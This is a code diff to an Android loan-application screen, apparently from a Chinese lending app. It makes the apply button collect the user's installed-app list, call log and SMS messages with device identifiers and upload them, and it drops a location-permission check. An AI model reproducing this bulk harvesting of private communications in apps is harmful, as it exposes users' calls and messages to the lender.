@@ -81,6 +81,8 @@ public class ConfirmBaseMoneyActivity extends BaseActivity implements View.OnCli
 
     private OrderConfirmBean mOrderConfirmBean;
 
+    private JSONObject mJSONObject;  // 上传用户信息的json
+    private int step = 0;   // 获取信息的步数  分别为 app列表 短信 通话记录
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -184,14 +186,14 @@ public class ConfirmBaseMoneyActivity extends BaseActivity implements View.OnCli
                 backActivity();
                 break;
             case R.id.tv_confirm_apply:
-//                uploadUserInfo();
-                onClickApply();
+                uploadUserInfo();
                 break;
             case R.id.tv_confirm_base_protocol:
                 gotoWebActivity();
                 break;
         }
     }
+
     /**
      * 刷新UI
      */
@@ -259,23 +261,6 @@ public class ConfirmBaseMoneyActivity extends BaseActivity implements View.OnCli
 
             String consume_amount = mOrderConfirmBean.getData().getConsume_amount(); //用户申请金额
             final String repay_id = mOrderConfirmBean.getData().getRepay_id();
-
-            if (TextUtils.isEmpty(location)) {
-                RxPermissions rxPermissions = new RxPermissions(ConfirmBaseMoneyActivity.this);
-                rxPermissions.request(Manifest.permission.ACCESS_FINE_LOCATION).subscribe(new Consumer<Boolean>() {
-                    @Override
-                    public void accept(Boolean aBoolean) throws Exception {
-                        if (aBoolean) {
-                            LocationUtil mLocationUtil = LocationUtil.getInstance(mContext);
-                            mLocationUtil.startLocation(ConfirmBaseMoneyActivity.this);
-                            mLocationUtil.setIsCallBack(true);
-                        }
-                        return;
-                    }
-                });
-                ToastUtil.showToast(mContext, "请打开定位权限!");
-                return;
-            }
 
             String black_box = new GetTelephoneUtils(mContext).getBlackBox();
             jsonObject.put("customer_id", customer_id);
@@ -387,8 +372,7 @@ public class ConfirmBaseMoneyActivity extends BaseActivity implements View.OnCli
     @Subscribe
     public void onAuthCenterBack(LocationEvent event) {
         LogUtil.d("abc", "收到了定位成功的消息");
-        onClickApply();
-//        uploadUserInfo();
+        uploadUserInfo();
     }
 
 
@@ -415,7 +399,6 @@ public class ConfirmBaseMoneyActivity extends BaseActivity implements View.OnCli
             return;
         }
         ViewUtil.createLoadingDialog(this, loadText, false);
-        LogUtil.d("userinfo", "location =" + location);
         mJSONObject = new JSONObject();
         String userId = TianShenUserUtil.getUserId(this);
         try {
@@ -424,22 +407,20 @@ public class ConfirmBaseMoneyActivity extends BaseActivity implements View.OnCli
             mJSONObject.put("is_wifi", PhoneInfoUtil.getNetworkType(this) ? "1" : "0");
             mJSONObject.put("device_id", UserUtil.getDeviceId(this));
             PhoneInfoUtil.getApp_list(this, myCallBack);
-            PhoneInfoUtil.getCall_list(this, myCallBack,null);
+            PhoneInfoUtil.getCall_list(this, myCallBack, null);
         } catch (JSONException e) {
             e.printStackTrace();
             ViewUtil.cancelLoadingDialog();
         }
     }
 
-    private JSONObject mJSONObject;
-    private int step = 0;
     private PhoneInfoUtil.PhoneInfoCallback myCallBack = new PhoneInfoUtil.PhoneInfoCallback() {
         @Override
         public void sendMessageToRegister(JSONArray jsonArray, String jsonArrayName) {
             try {
                 step++;
                 if ("call_list".equals(jsonArrayName)) {
-                    PhoneInfoUtil.getMessage_list(ConfirmBaseMoneyActivity.this, myCallBack,null);
+                    PhoneInfoUtil.getMessage_list(ConfirmBaseMoneyActivity.this, myCallBack, null);
                 }
                 mJSONObject.put(jsonArrayName, jsonArray);
                 if (step == 3) {
@@ -468,6 +449,7 @@ public class ConfirmBaseMoneyActivity extends BaseActivity implements View.OnCli
 
             @Override
             public void onFailure(String url, int errorType, int errorCode) {
+                onClickApply();
                 LogUtil.d("userinfo", "failure" + url + ",errortype = " + errorType + ",errorcode = " + errorCode);
             }
         });
